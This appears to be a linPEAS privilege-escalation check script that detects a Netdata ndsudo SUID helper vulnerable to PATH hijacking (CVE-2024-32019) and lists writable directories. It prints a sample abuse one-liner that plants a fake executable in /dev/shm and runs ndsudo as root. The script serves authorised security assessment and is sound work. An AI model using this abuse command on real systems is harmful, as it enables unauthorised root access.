# Title: Interesting Permissions Files - Netdata ndsudo PATH hijack (CVE-2024-32019)
# ID: IP_Netdata_ndsudo
# Author: HT Bot
# Last Update: 06-12-2025
# Description: Detect Netdata ndsudo SUID helper vulnerable to PATH hijacking (CVE-2024-32019)
# License: GNU GPL
# Version: 1.0
# Functions Used: print_2title, print_info
# Global Variables: $SEARCH_IN_FOLDER, $HOME, $PATH
# Initial Functions:
# Generated Global Variables: $ndsudo_candidates, $guess_path, $found_paths, $guess_dir, $ndsudo_bin, $perm_info, $owner, $group, $perms, $ndsudo_help, $command_list, $exec_list, $writable_dirs, $hijack_dir, $default_exec, $default_cmd
# Fat linpeas: 0
# Small linpeas: 1

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Netdata ndsudo PATH hijack (CVE-2024-32019)"
  print_info "https://nvd.nist.gov/vuln/detail/CVE-2024-32019"

  ndsudo_candidates=""

  if command -v ndsudo >/dev/null 2>&1; then
    ndsudo_candidates=$(command -v ndsudo 2>/dev/null)
  fi

  for guess_path in \
    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo \
    /usr/libexec/netdata/plugins.d/ndsudo \
    /usr/lib/netdata/plugins.d/ndsudo \
    /opt/netdata/usr/sbin/ndsudo \
    /opt/netdata/bin/ndsudo \
    /usr/sbin/ndsudo; do
    if [ -f "$guess_path" ]; then
      ndsudo_candidates="$ndsudo_candidates
$guess_path"
    fi
  done

  for guess_dir in /opt/netdata /usr/libexec/netdata /usr/lib/netdata /usr/local/netdata; do
    if [ -d "$guess_dir" ]; then
      found_paths=$(find "$guess_dir" -type f -name ndsudo 2>/dev/null | head -n 5)
      if [ "$found_paths" ]; then
        ndsudo_candidates="$ndsudo_candidates
$found_paths"
      fi
    fi
  done

  ndsudo_candidates=$(printf "%s\n" "$ndsudo_candidates" | grep -v "^$" | sort -u)

  if [ -z "$ndsudo_candidates" ]; then
    echo "ndsudo helper not present."
  else
    printf "%s\n" "$ndsudo_candidates" | while read -r ndsudo_bin; do
      [ -z "$ndsudo_bin" ] && continue
      if [ ! -x "$ndsudo_bin" ]; then
        echo "$ndsudo_bin exists but the current user cannot execute it."
        continue
      fi

      perm_info=$(ls -l "$ndsudo_bin" 2>/dev/null)
      owner=$(printf "%s" "$perm_info" | awk '{print $3}')
      group=$(printf "%s" "$perm_info" | awk '{print $4}')
      perms=$(printf "%s" "$perm_info" | awk '{print $1}')

      if [ -u "$ndsudo_bin" ] && [ "$owner" = "root" ]; then
        echo "Potential Netdata ndsudo PATH injection vector: $ndsudo_bin (owner: $owner:$group perms: $perms)"

        ndsudo_help=$("$ndsudo_bin" --help 2>/dev/null)
        if [ -z "$ndsudo_help" ]; then
          ndsudo_help=$("$ndsudo_bin" -h 2>/dev/null)
        fi

        command_list=$(printf "%s" "$ndsudo_help" | awk -F: '/Command/{gsub(/^[ \t]+|[ \t]+$/, "", $2); if($2!=""){printf "%s ", $2}}')
        exec_list=$(printf "%s" "$ndsudo_help" | awk -F: '/Executables/{gsub(/^[ \t]+|[ \t]+$/, "", $2); if($2!=""){printf "%s ", $2}}')

        if [ "$command_list" ]; then
          echo "  Logical commands: $command_list"
        fi
        if [ "$exec_list" ]; then
          echo "  Executables resolved via PATH: $exec_list"
        fi
        if printf "%s" "$ndsudo_help" | grep -qi "searches for executables"; then
          echo "  Helper confirms it searches for executables via PATH."
        fi

        writable_dirs=""
        for hijack_dir in /dev/shm /tmp /var/tmp "$HOME/.local/bin" "$HOME/bin"; do
          if [ -d "$hijack_dir" ] && [ -w "$hijack_dir" ]; then
            writable_dirs="$writable_dirs $hijack_dir"
          fi
        done
        if [ "$writable_dirs" ]; then
          echo "  Writable dirs you can prepend to PATH: $writable_dirs"
        fi

        default_exec=$(printf "%s" "$exec_list" | awk '{print $1}')
        [ -z "$default_exec" ] && default_exec="nvme"
        default_cmd=$(printf "%s" "$command_list" | awk '{print $1}')
        [ -z "$default_cmd" ] && default_cmd="nvme-list"
        echo "  Sample abuse: printf '#!/bin/sh\\nid' > /dev/shm/$default_exec; chmod +x /dev/shm/$default_exec; PATH=/dev/shm:\\$PATH $ndsudo_bin $default_cmd"
        echo "  Fixed in Netdata 1.45.3 / 1.45.2-169."
      else
        echo "$ndsudo_bin present but not SUID-root (owner: $owner:$group perms: $perms)."
      fi
    done
  fi
  echo ""
fi
